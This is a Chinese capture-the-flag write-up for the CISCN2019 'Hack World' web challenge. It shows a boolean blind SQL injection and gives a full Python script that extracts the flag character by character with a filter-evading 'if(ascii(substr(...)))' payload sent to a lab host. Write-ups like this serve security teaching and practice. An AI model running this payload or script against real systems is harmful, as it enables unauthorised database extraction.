# [CISCN2019 华北赛区 Day2 Web1]Hack World

## 一、题目信息

Hint：flag{} 里为 uuid。

![image-20211020092850957](https://i.loli.net/2021/10/20/gem7tSQ6UM148Hp.png)



## 二、注入测试

1. 发现可以进行布尔盲注

![image-20211020101409129](https://i.loli.net/2021/10/20/Psxe728ZSDwvbfk.png)



2. 注入获取数据

```
user: root@localhost
database: ctftraining
```



3. 过滤了较多关键词，但发现存在flag表和flag列



4. 使用脚本自动盲注flag

```python
# -*- coding: UTF-8 -*-
'''
Date: 2021-10-20 11:05:59
'''
import requests
import time
url = 'http://8c833d8c-a2bd-4d7a-b0e1-a3aaecb99737.node4.buuoj.cn:81/index.php'
flag=""
for x in range(1,43):
    l = 32
    r = 126
    while r > l:
        mid = int((l+r+1) / 2)
        x = str(x)
        y = str(mid)
        id = {"id":'if(ascii(substr((select(flag)from(flag)),'+x+',1))>='+y+',1,0)'}
        response = requests.post(url=url,data=id)
        if "Hello" in response.text:
            l = mid
        else:
            r = mid-1
        time.sleep(0.03)
    flag+=(chr(int(r)))
    print(chr(int(r)))
print(flag)
```

Get Flag!

